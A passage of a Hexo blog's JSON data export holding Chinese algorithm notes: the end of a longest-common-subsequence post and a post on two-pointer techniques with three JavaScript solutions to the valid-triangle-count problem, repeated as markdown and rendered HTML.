时最长公共子序列的值</li>\n<li>当 <code>i</code>、<code>j</code> 等于 <code>0</code> 时，表示其中一个字符串为空字符串，则 <code>arr[i][i]</code> 为 <code>0</code></li>\n<li>当 <code>arr[i] !== arr[j]</code> 时，说明指针移动时<strong>新添加的 1 个字符</strong>没有匹配上，则 <code>arr[i][i] = Math.max(arr[i][j - 1], arr[i - 1][j])</code></li>\n<li>当 <code>arr[i] === arr[j]</code> 时，说明指针移动时<strong>新添加的 1 个字符</strong>正好匹配上，则 <code>arr[i][j] = arr[i - 1][j - 1] + 1</code></li>\n</ol>\n<p><strong>说明：</strong></p>\n<blockquote>\n<p>对于每次 <strong>新添加的 1 个字符</strong>，如果没有匹配上，相当于是即使其中个字符串没有最后一个字符，最长公共子序列的值也是一样的，所以此时 <code>arr[i][i] = Math.max(arr[i][j - 1], arr[i - 1][j])</code><br>如果 <strong>新添加的 1 个字符</strong> 刚好满足 <code>arr[i] === arr[j]</code>，当字符串1、字符串2同时去掉这个字符时最长公共子序列的值为 <code>arr[i - 1][j - 1]</code>，所以当同时加上这个字符时，<code>arr[i][j] = arr[i - 1][j - 1] + 1</code></p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> longestCommonSubsequence = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">text1, text2</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> len1 = text1.length;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> len2 = text2.length;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> arr = [];</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt;= len1; i++) &#123;</span><br><span class=\"line\">    arr[i] = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> j = <span class=\"number\">0</span>; j &lt;= len2; j++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (i ===<span class=\"number\">0</span> || j === <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        arr[i][j] = <span class=\"number\">0</span>;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (text1[i - <span class=\"number\">1</span>] === text2[j - <span class=\"number\">1</span>]) &#123;</span><br><span class=\"line\">        arr[i][j] = arr[i - <span class=\"number\">1</span>][j - <span class=\"number\">1</span>] + <span class=\"number\">1</span>;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        arr[i][j] = <span class=\"built_in\">Math</span>.max(arr[i][j - <span class=\"number\">1</span>], arr[i - <span class=\"number\">1</span>][j]);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> arr[len1][len2];</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>"},{"title":"技巧篇 - 双指针","date":"2021-05-24T08:32:28.000Z","_content":"\n\n# 技巧篇 - 双指针\n\n## 1. 快慢指针\n说明： 主要用于**链表**结构中，通常初始状态时快、慢指针都指向 head 节点，前进时 fast 指针在前（速度 2n），slow 指针在后 （速度 n）\n\n**使用场景**\n* 判断链表中是否有闭环\n* 已知链表中有闭环，求这个闭环的起始位置\n* 寻找链表中的中间节点\n* 寻找链表中的倒数第 k 个元素\n\n\n## 2. 左右指针\n说明：主要用于**数组**结构中，通常初始状态时左、右针分别指向 arr[0]、arr[arr.length - 1]\n\n**使用场景**\n* 二分查找\n* 求数值的平方根\n* 两数之和（求有序数组中和为 target 的两个数）\n* 反转数组\n* 有效三角形的个数\n\n### 2.1 有效三角形的个数\n\n描述：给定一个包含非负整数的数组，你的任务是统计其中可以组成三角形三条边的三元组个数。\n\n**示例：**\n输入: [2,2,3,4]\n输出: 3\n\n**解释:**\n有效的组合是: \n2,3,4 (使用第一个 2)\n2,3,4 (使用第二个 2)\n2,2,3\n\n**解题思路：**\n判断三条边能组成三角形的条件为：\n* 任意两边之和大于第三边，任意两边之差小于第三边。\n* 如果三条边长从**小到大**为 a、b、c，当且仅当 a + b > c 这三条边能组成三角形。\n\n\n\n```js\n/**\n * --暴力破解--\n * 使用三重循环枚举\n * 时间复杂度为 O(n^3)\n*/\nfunction triangleNumber(nums) {\n  if (nums.length < 3) return 0\n\n  let result = 0\n  let checkResult = function(a, b, c) {\n    const flag = a + b > c && a + c > b && b + c > a\n    \n    if (flag) result++\n  }\n\n  for (let i = 0; i < nums.length - 2; i++) {\n    for (let j = i + 1; j < nums.length - 1; j++) {\n      for (let k = j + 1; k < nums.length; k++) {\n        checkResult(nums[i], nums[j], nums[k])\n      }\n    }\n  }\n\n  return result\n}\n\nconsole.log(triangleNumber([2,2,3,4])) // 3\nconsole.log(triangleNumber([1,1,3,4]))  // 0\nconsole.log(triangleNumber([24,3,82,22,35,84,19])) // 20\n```\n\n\n```js\n/**\n * -- 二分查找 --\n * 1. 首先对数组排序。\n * 2. 固定最短的两条边，二分查找最后一个小于两边之和的位置。可以求得固定两条边长之和满足条件的结果。枚举* 结束后，总和就是答案。\n * 时间复杂度为 O(n^2logn)\n*/\nfunction triangleNumber(nums) {\n  if (nums.length < 3) return 0\n\n  nums.sort((a, b) => a - b)\n\n  let count = 0\n  let searchPosition = (left, right, sum) => {\n    while (left <= right && right < nums.length) {\n      let middle = Math.floor((left + right + 1) / 2)\n\n      if (nums[middle] >= sum) {\n        right = middle - 1\n      } else {\n        left = middle + 1\n      }\n    }\n\n    return Math.floor(left)\n  }\n\n  let len = nums.length\n  for(let i = 0; i < len - 2; i++) {\n    for (let j = i + 1; j < len - 1; j++) {\n      if (nums[i] !== 0) { // 某条边为 0 时不能形成三角形\n        k = searchPosition(j + 1, len - 1, nums[i] + nums[j])\n        count += k - j - 1\n      }\n    }\n  }\n\n  return count\n}\n```\n\n```js\n/**\n * -- 双指针 --\n * 1. 首先对数组排序。\n * 2. 固定最长的一条边，运用双指针扫描\n * 2.1 如果 nums[l] + nums[r] > nums[i]，同时说明 nums[l + 1] + nums[r] > nums[i], ..., nums[r - 1] + nums[r] > nums[i]，满足的条件的有 r - l 种，r 左移进入下一轮。\n * 2.2 如果 nums[l] + nums[r] <= nums[i]，l 右移进入下一轮。\n * 枚举结束后，总和就是答案。\n * 时间复杂度为 O(n^2)\n )。\n\n*/\nfunction triangleNumber(nums) {\n  if (nums.length < 3) return 0\n\n  nums.sort((a, b) => a - b)\n\n  let count = 0\n  let len = nums.length\n\n  for (let i = len - 1; i >= 2; --i) {\n    let left = 0;\n    let right = i - 1;\n\n    while (left < right) {\n      if (nums[left] + nums[right] > nums[i]) {\n        count += right - left\n        --right\n      } else {\n        ++left\n      }\n    }\n  }\n\n  return count\n}\n```","source":"_posts/算法题/技巧篇 - 双指针.md","raw":"---\ntitle: 技巧篇 - 双指针\ncategories: 算法题\ntags: [算法题, 技巧篇]\ndate: 2021-05-24 16:32:28\n---\n\n\n# 技巧篇 - 双指针\n\n## 1. 快慢指针\n说明： 主要用于**链表**结构中，通常初始状态时快、慢指针都指向 head 节点，前进时 fast 指针在前（速度 2n），slow 指针在后 （速度 n）\n\n**使用场景**\n* 判断链表中是否有闭环\n* 已知链表中有闭环，求这个闭环的起始位置\n* 寻找链表中的中间节点\n* 寻找链表中的倒数第 k 个元素\n\n\n## 2. 左右指针\n说明：主要用于**数组**结构中，通常初始状态时左、右针分别指向 arr[0]、arr[arr.length - 1]\n\n**使用场景**\n* 二分查找\n* 求数值的平方根\n* 两数之和（求有序数组中和为 target 的两个数）\n* 反转数组\n* 有效三角形的个数\n\n### 2.1 有效三角形的个数\n\n描述：给定一个包含非负整数的数组，你的任务是统计其中可以组成三角形三条边的三元组个数。\n\n**示例：**\n输入: [2,2,3,4]\n输出: 3\n\n**解释:**\n有效的组合是: \n2,3,4 (使用第一个 2)\n2,3,4 (使用第二个 2)\n2,2,3\n\n**解题思路：**\n判断三条边能组成三角形的条件为：\n* 任意两边之和大于第三边，任意两边之差小于第三边。\n* 如果三条边长从**小到大**为 a、b、c，当且仅当 a + b > c 这三条边能组成三角形。\n\n\n\n```js\n/**\n * --暴力破解--\n * 使用三重循环枚举\n * 时间复杂度为 O(n^3)\n*/\nfunction triangleNumber(nums) {\n  if (nums.length < 3) return 0\n\n  let result = 0\n  let checkResult = function(a, b, c) {\n    const flag = a + b > c && a + c > b && b + c > a\n    \n    if (flag) result++\n  }\n\n  for (let i = 0; i < nums.length - 2; i++) {\n    for (let j = i + 1; j < nums.length - 1; j++) {\n      for (let k = j + 1; k < nums.length; k++) {\n        checkResult(nums[i], nums[j], nums[k])\n      }\n    }\n  }\n\n  return result\n}\n\nconsole.log(triangleNumber([2,2,3,4])) // 3\nconsole.log(triangleNumber([1,1,3,4]))  // 0\nconsole.log(triangleNumber([24,3,82,22,35,84,19])) // 20\n```\n\n\n```js\n/**\n * -- 二分查找 --\n * 1. 首先对数组排序。\n * 2. 固定最短的两条边，二分查找最后一个小于两边之和的位置。可以求得固定两条边长之和满足条件的结果。枚举* 结束后，总和就是答案。\n * 时间复杂度为 O(n^2logn)\n*/\nfunction triangleNumber(nums) {\n  if (nums.length < 3) return 0\n\n  nums.sort((a, b) => a - b)\n\n  let count = 0\n  let searchPosition = (left, right, sum) => {\n    while (left <= right && right < nums.length) {\n      let middle = Math.floor((left + right + 1) / 2)\n\n      if (nums[middle] >= sum) {\n        right = middle - 1\n      } else {\n        left = middle + 1\n      }\n    }\n\n    return Math.floor(left)\n  }\n\n  let len = nums.length\n  for(let i = 0; i < len - 2; i++) {\n    for (let j = i + 1; j < len - 1; j++) {\n      if (nums[i] !== 0) { // 某条边为 0 时不能形成三角形\n        k = searchPosition(j + 1, len - 1, nums[i] + nums[j])\n        count += k - j - 1\n      }\n    }\n  }\n\n  return count\n}\n```\n\n```js\n/**\n * -- 双指针 --\n * 1. 首先对数组排序。\n * 2. 固定最长的一条边，运用双指针扫描\n * 2.1 如果 nums[l] + nums[r] > nums[i]，同时说明 nums[l + 1] + nums[r] > nums[i], ..., nums[r - 1] + nums[r] > nums[i]，满足的条件的有 r - l 种，r 左移进入下一轮。\n * 2.2 如果 nums[l] + nums[r] <= nums[i]，l 右移进入下一轮。\n * 枚举结束后，总和就是答案。\n * 时间复杂度为 O(n^2)\n )。\n\n*/\nfunction triangleNumber(nums) {\n  if (nums.length < 3) return 0\n\n  nums.sort((a, b) => a - b)\n\n  let count = 0\n  let len = nums.length\n\n  for (let i = len - 1; i >= 2; --i) {\n    let left = 0;\n    let right = i - 1;\n\n    while (left < right) {\n      if (nums[left] + nums[right] > nums[i]) {\n        count += right - left\n        --right\n      } else {\n        ++left\n      }\n    }\n  }\n\n  return count\n}\n```","slug":"算法题/技巧篇 - 双指针","published":1,"updated":"2021-06-07T09:59:30.344Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckpmga1yk000dok6r2c8jan2z","content":"<h1 id=\"技巧篇-双指针\"><a href=\"#技巧篇-双指针\" class=\"headerlink\" title=\"技巧篇 - 双指针\"></a>技巧篇 - 双指针</h1><h2 id=\"1-快慢指针\"><a href=\"#1-快慢指针\" class=\"headerlink\" title=\"1. 快慢指针\"></a>1. 快慢指针</h2><p>说明： 主要用于<strong>链表</strong>结构中，通常初始状态时快、慢指针都指向 head 节点，前进时 fast 指针在前（速度 2n），slow 指针在后 （速度 n）</p>\n<p><strong>使用场景</strong></p>\n<ul>\n<li>判断链表中是否有闭环</li>\n<li>已知链表中有闭环，求这个闭环的起始位置</li>\n<li>寻找链表中的中间节点</li>\n<li>寻找链表中的倒数第 k 个元素</li>\n</ul>\n<h2 id=\"2-左右指针\"><a href=\"#2-左右指针\" class=\"headerlink\" title=\"2. 左右指针\"></a>2. 左右指针</h2><p>说明：主要用于<strong>数组</strong>结构中，通常初始状态时左、右针分别指向 arr[0]、arr[arr.length - 1]</p>\n<p><strong>使用场景</strong></p>\n<ul>\n<li>二分查找</li>\n<li>求数值的平方根</li>\n<li>两数之和（求有序数组中和为 target 的两个数）</li>\n<li>反转数组</li>\n<li>有效三角形的个数</li>\n</ul>\n<h3 id=\"2-1-有效三角形的个数\"><a href=\"#2-1-有效三角形的个数\" class=\"headerlink\" title=\"2.1 有效三角形的个数\"></a>2.1 有效三角形的个数</h3><p>描述：给定一个包含非负整数的数组，你的任务是统计其中可以组成三角形三条边的三元组个数。</p>\n<p><strong>示例：</strong><br>输入: [2,2,3,4]<br>输出: 3</p>\n<p><strong>解释:</strong><br>有效的组合是:<br>2,3,4 (使用第一个 2)<br>2,3,4 (使用第二个 2)<br>2,2,3</p>\n<p><strong>解题思路：</strong><br>判断三条边能组成三角形的条件为：</p>\n<ul>\n<li>任意两边之和大于第三边，任意两边之差小于第三边。</li>\n<li>如果三条边长从<strong>小到大</strong>为 a、b、c，当且仅当 a + b &gt; c 这三条边能组成三角形。</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * --暴力破解--</span></span><br><span class=\"line\"><span class=\"comment\"> * 使用三重循环枚举</span></span><br><span class=\"line\"><span class=\"comment\"> * 时间复杂度为 O(n^3)</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">triangleNumber</span>(<span class=\"params\">nums</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (nums.length &lt; <span class=\"number\">3</span>) <span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> result = <span class=\"number\">0</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> checkResult = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">a, b, c</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> flag = a + b &gt; c &amp;&amp; a + c &gt; b &amp;&amp; b + c &gt; a</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (flag) result++</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; nums.length - <span class=\"number\">2</span>; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> j = i + <span class=\"number\">1</span>; j &lt; nums.length - <span class=\"number\">1</span>; j++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> k = j + <span class=\"number\">1</span>; k &lt; nums.length; k++) &#123;</span><br><span class=\"line\">        checkResult(nums[i], nums[j], nums[k])</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> result</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(triangleNumber([<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>])) <span class=\"comment\">// 3</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(triangleNumber([<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>]))  <span class=\"comment\">// 0</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(triangleNumber([<span class=\"number\">24</span>,<span class=\"number\">3</span>,<span class=\"number\">82</span>,<span class=\"number\">22</span>,<span class=\"number\">35</span>,<span class=\"number\">84</span>,<span class=\"number\">19</span>])) <span class=\"comment\">// 20</span></span><br></pre></td></tr></table></figure>\n\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * -- 二分查找 --</span></span><br><span class=\"line\"><span class=\"comment\"> * 1. 首先对数组排序。</span></span><br><span class=\"line\"><span class=\"comment\"> * 2. 固定最短的两条边，二分查找最后一个小于两边之和的位置。可以求得固定两条边长之和满足条件的结果。枚举* 结束后，总和就是答案。</span></span><br><span class=\"line\"><span class=\"comment\"> * 时间复杂度为 O(n^2logn)</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">triangleNumber</span>(<span class=\"params\">nums</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (nums.length &lt; <span class=\"number\">3</span>) <span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">  nums.sort(<span class=\"function\">(<span class=\"params\">a, b</span>) =&gt;</span> a - b)</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> count = <span class=\"number\">0</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> searchPosition = <span class=\"function\">(<span class=\"params\">left, right, sum</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (left &lt;= right &amp;&amp; right &lt; nums.length) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">let</span> middle = <span class=\"built_in\">Math</span>.floor((left + right + <span class=\"number\">1</span>) / <span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (nums[middle] &gt;= sum) &#123;</span><br><span class=\"line\">        right = middle - <span class=\"number\">1</span></span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        left = middle + <span class=\"number\">1</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">Math</span>.floor(left)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> len = nums.length</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; len - <span class=\"number\">2</span>; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> j = i + <span class=\"number\">1</span>; j &lt; len - <span class=\"number\">1</span>; j++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (nums[i] !== <span class=\"number\">0</span>) &#123; <span class=\"comment\">// 某条边为 0 时不能形成三角形</span></span><br><span class=\"line\">        k = searchPosition(j + <span class=\"number\">1</span>, len - <span class=\"number\">1</span>, nums[i] + nums[j])</span><br><span class=\"line\">        count += k - j - <span class=\"number\">1</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> count</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * -- 双指针 --</span></span><br><span class=\"line\"><span class=\"comment\"> * 1. 首先对数组排序。</span></span><br><span class=\"line\"><span class=\"comment\"> * 2. 固定最长的一条边，运用双指针扫描</span></span><br><span class=\"line\"><span class=\"comment\"> * 2.1 如果 nums[l] + nums[r] &gt; nums[i]，同时说明 nums[l + 1] + nums[r] &gt; nums[i], ..., nums[r - 1] + nums[r] &gt; nums[i]，满足的条件的有 r - l 种，r 左移进入下一轮。</span></span><br><span class=\"line\"><span class=\"comment\"> * 2.2 如果 nums[l] + nums[r] &lt;= nums[i]，l 右移进入下一轮。</span></span><br><span class=\"line\"><span class=\"comment\"> * 枚举结束后，总和就是答案。</span></span><br><span class=\"line\"><span class=\"comment\"> * 时间复杂度为 O(n^2)</span></span><br><span class=\"line\"><span class=\"comment\"> )。</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">triangleNumber</span>(<span class=\"params\">nums</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (nums.length &lt; <span class=\"number\">3</span>) <span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">  nums.sort(<span class=\"function\">(<span class=\"params\">a, b</span>) =&gt;</span> a - b)</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> count = <span class=\"number\">0</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> len = nums.length</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = len - <span class=\"number\">1</span>; i &gt;= <span class=\"number\">2</span>; --i) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> left = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> right = i - <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (left &lt; right) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (nums[left] + nums[right] &gt; nums[i]) &#123;</span><br><span class=\"line\">        count += right - left</span><br><span class=\"line\">        --right</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        ++left</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> count</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"技巧篇-双指针\"><a href=\"#技巧篇-双指针\" class=\"headerlink\" title=\"技巧篇 - 双指针\"></a>技巧篇 - 双指针</h1><h2 id=\"1-快慢指针\"><a href=\"#1-快慢指针\" class=\"headerlink\" title=\"1. 快慢指针\"></a>1. 快慢指针</h2><p>说明： 主要用于<strong>链表</strong>结构中，通常初始状态时快、慢指针都指向 head 节点，前进时 fast 指针在前（速度 2n），slow 指针在后 （速度 n）</p>\n<p><strong>使用场景</strong></p>\n<ul>\n<li>判断链表中是否有闭环</li>\n<li>已知链表中有闭环，求这个闭环的起始位置</li>\n<li>寻找链表中的中间节点</li>\n<li>寻找链表中的倒数第 k 个元素</li>\n</ul>\n<h2 id=\"2-左右指针\"><a href=\"#2-左右指针\" class=\"headerlink\" title=\"2. 左右指针\"></a>2. 左右指针</h2><p>说明：主要用于<strong>数组</strong>结构中，通常初始状态时左、右针分别指向 arr[0]、arr[arr.length - 1]</p>\n<p><strong>使用场景</strong></p>\n<ul>\n<li>二分查找</li>\n<li>求数值的平方根</li>\n<li>两数之和（求有序数组中和为 target 的两个数）</li>\n<li>反转数组</li>\n<li>有效三角形的个数</li>\n</ul>\n<h3 id=\"2-1-有效三角形的个数\"><a href=\"#2-1-有效三角形的个数\" class=\"headerlink\" title=\"2.1 有效三角形的个数\"></a>2.1 有效三角形的个数</h3><p>描述：给定一个包含非负整数的数组，你的任务是统计其中可以组成三角形三条边的三元组个数。</p>\n<p><strong>示例：</strong><br>输入: [2,2,3,4]<br>输出: 3</p>\n<p><strong>解释:</strong><br>有效的组合是:<br>2,3,4 (使用第一个 2)<br>2,3,4 (使用第二个 2)<br>2,2,3</p>\n<p><strong>解题思路：</strong><br>判断三条边能组成三角形的条件为：</p>\n<ul>\n<li>任意两边之和大于第三边，任意两边之差小于第三边。</li>\n<li>如果三条边长从<strong>小到大</strong>为 a、b、c，当且仅当 a + b &gt; c 这三条边能组成三角形。</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * --暴力破解--</span></span><br><span class=\"line\"><span class=\"comment\"> * 使用三重循环枚举</span></span><br><span class=\"line\"><span class=\"comment\"> * 时间复杂度为 O(n^3)</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">triangleNumber</span>(<span class=\"params\">nums</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (nums.length &lt; <span class=\"number\">3</span>) <span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> result = <span class=\"number\">0</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> checkResult = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">a, b, c</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> flag = a + b &gt; c &amp;&amp; a + c &gt; b &amp;&amp; b + c &gt; a</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (flag) result++</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> 